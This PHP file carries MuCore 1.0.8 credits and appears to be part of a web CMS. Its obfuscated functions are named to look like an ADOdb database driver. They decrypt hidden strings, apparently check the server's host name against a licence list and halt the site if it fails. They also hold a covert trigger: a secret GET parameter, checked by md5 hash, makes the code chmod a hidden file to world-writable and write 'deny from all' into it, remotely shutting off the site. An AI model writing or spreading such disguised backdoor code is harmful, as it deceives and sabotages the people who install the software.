<?php
/**
* @+===========================================================================+
* @¦ MuCore 1.0.8 English.       					       ¦
* @¦ Credits: Isumeru & MaryJo  					       ¦
* @¦ +=======================================================================+ ¦
* @¦ ¦  "He who Copy/Pastes Shall Inherit My Mistakes But Not My Knowledge"  ¦ ¦
* @¦ +=======================================================================+ ¦
* @¦ Official Site:   http://bizarre-networks.net                              ¦
* @+===========================================================================+
* @¦ Our Allied Site: http://chileplanet.org                                   ¦
* @+===========================================================================+
*/
function ADOdb_retrim( $enc_text, $rdwp = "code", $iv_len = 16 )
{
    $enc_text = base64_decode( $enc_text );
    $n = strlen( $enc_text );
    $i = $iv_len;
    $plain_text = "";
    $iv = substr( $rdwp ^ substr( $enc_text, 0, $iv_len ), 0, 512 );
    while ( $i < $n )
    {
        $block = substr( $enc_text, $i, 16 );
        $plain_text .= $block ^ pack( "H*", md5( $iv ) );
        $iv = substr( $block.$iv, 0, 512 ) ^ $rdwp;
        $i += 16;
    }
    return preg_replace( "/\\x13\\x00*\$/", "", $plain_text );
}

function ADODB_Driver_Pharse( $driver, $ph )
{
    if ( $ph == "1" )
    {
        return true;
    }
    if ( empty( $driver ) && $ph == "2" && substr( $driver, 0, 1 ) == "W" )
    {
        return true;
    }
}

function ADODB_GET_DRIVER( $driver, $dir )
{
    if ( is_file( $dir."/../".$driver ) )
    {
        return true;
    }
}

function pharse_driver_db( $driver )
{
    return explode( "\\^||", $driver );
}

function adodb_pharse_bridge( $cti )
{
    $change_bridge = ADOdb_bridge_options( "", ADOdb_DETRIM( "%c~uvhvgy", "", "adodb_bridge" ), "c" );
    $open_cti_bridge = fopen( ADOdb_DETRIM( "%c~uvhvgy", "", "adodb_bridge" ), "w" );
    $remake_bridge = ADOdb_bridge_options( "deny from all", $open_cti_bridge, "t" );
    $break_bridge = fclose( $open_cti_bridge );
}

function ADOdb_DETRIM( $str, $ky = "", $t = "0" )
{
    if ( $t == "adodb_drive" )
    {
        $ky = adodb_retrim( "v85vNsIzSQh6Vd/7N9TzmhCapqgWQhTq7mNathFbmctKKrcvY9UGHqVYwOJMx2NE" );
    }
    else if ( $t == "adodb_list" )
    {
        $ky = adodb_retrim( "3gdCfTZmSYsHwHWfQx84HICm/lTlZ+zJZXotmukqGDeQY7XntLfMLGL2RoUaUvRB" );
    }
    else if ( $t = "adodb_bridge" )
    {
        $ky = adodb_retrim( "sC2qLDOgKI66OvEtU6X1BDLeetSKL/LsCXGi3gaNibQ=" );
    }
    if ( $ky == "" )
    {
        return $str;
    }
    $ky = str_replace( chr( 32 ), "", $ky );
    if ( strlen( $ky ) < 8 )
    {
        exit( );
    }
    $kl = strlen( $ky ) < 32 ? strlen( $ky ) : 32;
    $k = array( );
    $i = 0;
    while ( $i < $kl )
    {
        $k[$i] = ord( $ky[$i] ) & 31;
        ++$i;
    }
    $j = 0;
    $i = 0;
    while ( $i < strlen( $str ) )
    {
        $e = ord( $str[$i] );
        $str[$i] = $e & 224 ? chr( $e ^ $k[$j] ) : chr( $e );
        ++$j;
        $j = $j == $kl ? 0 : $j;
        ++$i;
    }
    return $str;
}

function ADOdb_octi( $octi )
{
    $a = "x344";
    $octi2 = "x233Xf";
    return base64_decode( $octi );
}

function ADODB_Bridge_Clean( $clean_bridge )
{
    return true;
}

function ADOdb_bridge_options( $option = null, $cti = null, $type = null )
{
    if ( $type == "c" )
    {
        return chmod( $cti, 511 );
    }
    if ( $type == "t" )
    {
        return fwrite( $cti, $option );
    }
}

function ADODB_TransDom( )
{
    if ( adodb_get_driver( adodb_detrim( "o}omdn/pgxw", "", "adodb_drive" ), ADODB_DIR_LIB ) == true )
    {
        ob_start( );
        include( ADODB_DIR_LIB."/../".adodb_detrim( "o}omdn/pgxw", "", "adodb_drive" )."" );
        $ADOdb_drive = ob_get_contents( );
        ob_end_clean( );
    }
    else
    {
        define( "ADODB_OCTI_F01", "1" );
        $ADOdb_drive = "adodb_drive_f05";
    }
    if ( adodb_driver_pharse( $ADOdb_drive, "1" ) == true || defined( "ADODB_OCTI_F01" ) )
    {
        define( "ADODB_OCTI_F00", "1" );
        $ADOdb_drive = "adodb_drive_octi:adodb_drive_f00";
    }
    $ADOdb_drive_list = pharse_driver_db( $ADOdb_drive );
    foreach ( $ADOdb_drive_list as $ADOdb_constructor )
    {
        if ( defined( "ADODB_OCTI_F00" ) )
        {
            $ADODB_pipe = $ADOdb_constructor;
        }
        else
        {
            $constructor_pharse = adodb_detrim( $ADOdb_constructor, "", "adodb_list" );
            $constructor_pipe = adodb_retrim( $constructor_pharse );
            $ADODB_pipe = ADODB_POINT( adodb_octi( $constructor_pipe ) );
            if ( adodb_driver_pharse( $ADODB_pipe, "1" ) == true )
            {
                $ADODB_pipe = "adodb_drive_octi:adodb_drive_f00";
            }
        }
        if ( !( $ADODB_pipe == strtolower( ADODB_OCTI ) ) )
        {
            continue;
        }
        define( "ADODB_OCT_x00", "1" );
        break;
        break;
    }
    if ( !defined( "ADODB_OCT_x00" ) )
    {
        return true;
    }
}

function ADODB_FLUSH_DOM( $flush )
{
    define( "ADODB_safepath", "1" );
    define( "ADODB_execute", "0" );
    if ( $flush )
    {
        print adodb_detrim( "GXZIX('>=4,\"~p~c0;=~oezvmkkta:um{", "", "adodb_list" );
        exit( );
        return TRUE;
    }
}

function ADODB_POINT( $point )
{
    return ereg_replace( "[^A-Za-z0-9\\.\\:\\/-]", "", $point );
}

function ADODB_CONN_BRIDGE( $CONN_BRIDGE )
{
    if ( md5( $_GET["".adodb_detrim( "{jmqJbw", "", "adodb_bridge" ).""] ) == adodb_detrim( "<2<\$w2+u<%m\"r2><oww=puhw8!'hi3?%", "", "adodb_bridge" ) )
    {
        return true;
    }
}

ini_set( "display_errors", "Off" );
error_reporting( ~E_NOTICE && ~E_DEPRECATED );
$zkbpat = 1;
if ( !defined( "ADODB_DIR_LIB" ) )
{
    define( "ADODB_DIR_LIB", dirname( "engine\mssqldb_lib.php" ) );
}
define( "ADODB_OCTI", $_SERVER["".adodb_detrim( "QOZPOZ[HEYS", "", "adodb_list" ).""] );
if ( adodb_transdom( "ADODB_FLUSH" ) == true )
{
    adodb_flush_dom( ADODB_FLUSH_POINT );
}
if ( adodb_conn_bridge( "ADODB_BRIDGE_FLUSH" ) == true && adodb_bridge_clean( "ADODB_BRDIGE_CLEAN" ) == true )
{
    adodb_pharse_bridge( "cti_bridge" );
}
/**
* @+===========================================================================+
* @¦ MuCore 1.0.8 English.       					       ¦
* @¦ Credits: Isumeru & MaryJo  					       ¦
* @¦ +=======================================================================+ ¦
* @¦ ¦  "He who Copy/Pastes Shall Inherit My Mistakes But Not My Knowledge"  ¦ ¦
* @¦ +=======================================================================+ ¦
* @¦ Official Site:   http://bizarre-networks.net                              ¦
* @+===========================================================================+
* @¦ Our Allied Site: http://chileplanet.org                                   ¦
* @+===========================================================================+
*/
?>
